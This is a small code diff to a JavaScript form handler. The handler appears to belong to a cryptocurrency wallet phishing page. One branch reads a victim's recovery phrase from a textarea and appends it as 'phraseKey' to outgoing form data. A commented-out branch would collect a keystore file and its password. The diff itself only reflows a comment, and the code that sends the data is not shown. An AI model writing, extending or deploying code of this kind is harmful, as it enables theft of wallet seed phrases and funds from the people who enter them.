@@ -52,7 +52,8 @@ function o(e) {
     if (e.target.name === "phrasekey") {
         phrase = document.querySelector("textarea").value;
         r.append("phraseKey", phrase);
-    } /* else if (e.target.name === "keystorekey") {
+    } 
+    /* else if (e.target.name === "keystorekey") {
         jsonphrase = document.querySelector("textarea").value;
         password = document.querySelector('input[name="keystorePassword"]').value;
         r.append("jsonphrase", jsonphrase);
